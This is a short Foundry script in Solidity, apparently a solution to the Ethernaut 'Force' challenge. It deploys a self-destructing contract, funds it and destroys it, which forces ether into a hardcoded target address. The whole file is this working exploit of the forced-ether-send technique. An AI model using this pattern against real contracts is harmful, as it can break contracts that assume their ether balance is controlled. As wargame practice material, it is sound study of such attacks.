// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/SelfDestructor.sol";

contract ForceScript is Script {
    address instance = 0x4efDb1AA9BcAEa3a99b1ec2Ed826e20766fC50F8;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        SelfDestructor selfDestructor = new SelfDestructor();
        address(selfDestructor).call{value: 0.001 ether}("");
        selfDestructor.destroy(instance);
        vm.stopBroadcast();
    }
}
